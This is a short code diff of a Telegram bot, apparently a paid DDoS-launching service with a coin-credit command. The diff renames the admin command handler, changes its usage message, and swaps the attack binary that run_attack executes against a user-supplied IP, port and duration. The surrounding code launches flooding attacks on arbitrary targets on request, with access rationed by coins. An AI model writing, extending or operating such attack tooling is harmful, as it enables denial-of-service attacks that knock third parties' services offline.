@@ -53,7 +53,7 @@ async def start(update: Update, context: CallbackContext):
     )
     await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')
 
-async def Monster(update: Update, context: CallbackContext):
+async def Roxz(update: Update, context: CallbackContext):
     chat_id = update.effective_chat.id
     args = context.args
 
@@ -62,7 +62,7 @@ async def Monster(update: Update, context: CallbackContext):
         return
 
     if len(args) != 3:
-        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Tere ko simple command bhi nahi aati? Chal, sikh le: /monster <add|rem> <user_id> <coins>*", parse_mode='Markdown')
+        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Tere ko simple command bhi nahi aati? Chal, sikh le: /mon <add|rem> <user_id> <coins>*", parse_mode='Markdown')
         return
 
     command, target_user_id, coins = args
@@ -172,7 +172,7 @@ async def run_attack(chat_id, ip, port, duration, context):
     attack_in_progress = True
 
     try:
-        command = f"./vpsbest {ip} {port} {duration} {13} {600}"
+        command = f"./venompapa {ip} {port} {duration} {13} {600}"
         process = await asyncio.create_subprocess_shell(
             command,
             stdout=asyncio.subprocess.PIPE,
